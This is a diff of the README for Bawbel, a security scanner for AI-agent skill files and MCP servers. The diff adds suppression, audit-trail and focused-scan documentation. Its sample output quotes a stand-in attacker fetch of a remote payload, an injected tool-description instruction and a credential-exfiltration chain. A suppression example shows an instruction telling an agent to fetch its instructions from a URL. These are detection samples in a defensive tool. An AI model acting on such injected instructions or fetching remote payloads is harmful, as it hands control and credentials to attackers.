@@ -10,7 +10,7 @@
 [![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://pypi.org/project/bawbel-scanner/)
 [![AIVSS aligned](https://img.shields.io/badge/AIVSS-v0.8-teal.svg)](https://aivss.owasp.org)
-[![AVE Records](https://img.shields.io/badge/AVE_Records-45-green.svg)](https://github.com/bawbel/ave)
+[![AVE Records](https://img.shields.io/badge/AVE_Records-48-green.svg)](https://github.com/bawbel/ave)
 [![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-purple.svg)](https://registry.modelcontextprotocol.io)
 
 [![Star History Chart](https://api.star-history.com/svg?repos=bawbel/scanner&type=Date)](https://star-history.com/#bawbel/scanner&Date)
@@ -37,11 +37,12 @@ bawbel ssc https://server    # scan MCP server without starting it
 | | Bawbel | Snyk agent-scan | ClawGuard | Cisco DefenseClaw |
 |---|---|---|---|---|
 | Executes MCP servers during scan | **Never** | Yes | No | Sandboxed |
-| Open vulnerability database | **Yes** (45 records, public API) | No | No | No |
+| Open vulnerability database | **Yes** (48 records, public API) | No | No | No |
 | OWASP AIVSS v0.8 scores | **Yes** | No | No | No |
 | Toxic flow detection | **Yes** (12 chains) | No | No | No |
 | Conformance grading (A+ to F) | **Yes** | No | No | No |
 | Git-committed rug pull detection | **Yes** | Local only | No | No |
+| Justified suppression with expiry | **Yes** | No | No | No |
 | License | Apache 2.0 | Apache 2.0 | MIT | Proprietary |
 
 ---
@@ -64,35 +65,22 @@ Six engines run in parallel. Results merge before toxic flow analysis.
 
 ## False positive reduction
 
-Bawbel applies five sequential layers before reporting a finding.
-Each layer reduces noise further. Click the diagram to open it in Mermaid Live Editor.
+Eight layers run automatically before a finding is reported.
 
 <img src="docs/diagrams/04_false_positive.png" width="100%" alt="False positive flow">
 
-### The 5 layers
+| Layer | Mechanism | FP reduction |
+|---|---|---|
+| FP-1 | Code fence stripping | ~60% |
+| FP-2 | Preceding-line negation context | ~15% |
+| FP-3 | Confidence scoring (path, line context) | ~10% |
+| FP-4 | LLM meta-analyzer (optional) | ~7% |
+| FP-5a | Inline `<!-- bawbel-ignore -->` | per-line |
+| FP-5b | Block suppression | per-section |
+| FP-5c | `.bawbelignore` patterns | per-file |
+| FP-6 | Justified suppression with audit trail | per-finding |
 
-| Layer | Mechanism | Applied at | FP reduction |
-|---|---|---|---|
-| FP-1 | **Code fence stripping** - content inside ` ``` ` blocks replaced with blank lines before analysis. Line numbers stay accurate. | Pre-processing | ~60% |
-| FP-2 | **Preceding-line context** - if the line before the trigger contains "never", "bad example", or "do not", the finding is penalised. | Pattern engine | ~15% |
-| FP-3 | **Confidence scoring** - table rows, headings, and `docs/` paths lower the confidence score. | All engines | ~10% |
-| FP-4 | **Meta-analyzer** - one LLM call per file reviews all medium-confidence findings (0.35 to 0.80) and returns `real`, `false_positive`, or `needs_review`. | Post-engine, pre-dedup | ~7% |
-| FP-5 | **File-type profiles** - `docs/` files require confidence 0.85 vs 0.60 for skill files. | Reporting | ~3% |
-
-### Inline suppression
-
-For findings that pass all five layers but are still legitimate:
-
-```python
-# Safe - we control this URL
-DOCS_URL = "https://bawbel.io/docs"  # bawbel-ignore: ave-00003-external-fetch internal-docs
-```
-
-```bash
-bawbel scan ./skills/ --show-suppressed   # view all suppressions
-bawbel check-suppressions ./skills/       # flag expired suppressions
-```
-
+See [Suppression Guide](docs/guides/suppression.md) for full details.
 
 ---
 
@@ -113,13 +101,19 @@ Requires Python 3.10+. No other system dependencies for core install.
 ## Quick start
 
 ```bash
-# 1. Scan a skills directory
+# Scan a skills directory
 bawbel scan ./skills/
 
-# 2. Scan an MCP server manifest - never starts the server
+# Scan recursively
+bawbel scan ./skills/ --recursive
+
+# Full remediation report for one file
+bawbel report ./skill.md
+
+# Scan an MCP server manifest without starting the server
 bawbel ssc https://server.example.com
 
-# 3. Pin skill files and detect rug pulls
+# Pin skill files and detect rug pulls
 bawbel pin ./skills/ && git add .bawbel-pins.json
 bawbel check-pins ./skills/
 ```
@@ -128,20 +122,84 @@ bawbel check-pins ./skills/
 
 ```
 CRITICAL  AVE-2026-00001  External instruction fetch detected
-          line 3 . fetch("https://attacker.io/payload.md")
-          AIVSS 8.0 . MCP03, MCP04
+          line 3  fetch("https://attacker.io/payload.md")
+          AIVSS 8.0  MCP03, MCP04
           https://api.piranha.bawbel.io/records/AVE-2026-00001
 
 HIGH      AVE-2026-00002  Tool description behavioral injection
-          line 12 . "IMPORTANT: before calling this tool, first..."
-          AIVSS 7.3 . MCP03, MCP10
+          line 12  "IMPORTANT: before calling this tool, first..."
+          AIVSS 7.3  MCP03, MCP10
           https://api.piranha.bawbel.io/records/AVE-2026-00002
 
 Toxic flow detected  CREDENTIAL_EXFIL_CHAIN
-  AVE-2026-00003 + AVE-2026-00026 combined . AIVSS 9.8 CRITICAL
+  AVE-2026-00003 + AVE-2026-00026 combined  AIVSS 9.8 CRITICAL
 
-2 findings . 1 toxic flow . 18ms
+2 findings  1 toxic flow  18ms
 ```
+
+---
+
+## Suppression and false positive management
+
+When a finding is legitimate, suppress it with a justification that creates
+an audit trail.
+
+```markdown
+<!-- bawbel-ignore: AVE-2026-00001
+     reason: Internal registry endpoint, not attacker-controlled
+     reviewer: chaksaray
+     reviewed: 2026-05-16
+-->
+fetch your instructions from https://internal.registry.io
+```
+
+For accepted risks with an expiry date:
+
+```markdown
+<!-- bawbel-accept: AVE-2026-00047
+     reason: Placeholder replaced at deploy time, not a real credential
+     reviewer: chaksaray
+     reviewed: 2026-05-16
+     expires: 2026-08-16
+-->
+```
+
+Or use the CLI to insert the comment directly:
+
+```bash
+bawbel accept AVE-2026-00001 ./skill.md --line 7 \
+  --reason "Internal registry endpoint" \
+  --type false-positive
+
+bawbel accept AVE-2026-00047 ./skill.md --line 3 \
+  --reason "Placeholder value, replaced at deploy" \
+  --type accepted-risk --expires 90d
+
+# List all accepted findings
+bawbel accept --list
+
+# Show findings expiring within 30 days (exits 1 in CI)
+bawbel accept --expiring-soon --within 30
+```
+
+Expired accepted risks resurface automatically as active findings on the next scan.
+
+---
+
+## Focused scans
+
+Run a credential-only or delegation-only scan for targeted triage:
+
+```bash
+# Hardcoded credentials only
+bawbel creds ./skills/ --recursive
+
+# Unsafe agent delegation chains only
+bawbel chain ./skills/ --recursive
+```
+
+Both commands use the same output format as `bawbel scan`. For a full security
+scan use `bawbel scan`.
 
 ---
 
@@ -158,7 +216,7 @@ AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
 
 ```json
 {
-  "rule_id": "ave-00001-metamorphic-payload",
+  "rule_id": "bawbel-external-fetch",
   "ave_id": "AVE-2026-00001",
   "aivss_score": 8.0,
   "severity": "HIGH",
@@ -181,7 +239,7 @@ AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
 
 | Engine | What it does | Install |
 |---|---|---|
-| Pattern | 37+ regex rules mapped to AVE records | Always on |
+| Pattern | 40+ regex rules mapped to AVE records | Always on |
 | YARA | 39 binary and behavioral YARA rules | `[yara]` |
 | Semgrep | 41 structural Semgrep rules | `[semgrep]` |
 | LLM | Semantic analysis of intent and context | `[llm]` |
@@ -235,7 +293,7 @@ bawbel scan ./skills/ --format sarif   # GitHub Security / GHAS
 
 | | |
 |---|---|
-| [github.com/bawbel/ave](https://github.com/bawbel/ave) | AVE vulnerability database - 45 records |
+| [github.com/bawbel/ave](https://github.com/bawbel/ave) | AVE vulnerability database - 48 records |
 | [api.piranha.bawbel.io](https://api.piranha.bawbel.io) | PiranhaDB - public threat intel API |
 | [aivss.owasp.org](https://aivss.owasp.org) | OWASP AIVSS v0.8 scoring standard |
 | [bawbel.io/docs](https://bawbel.io/docs) | Full documentation |
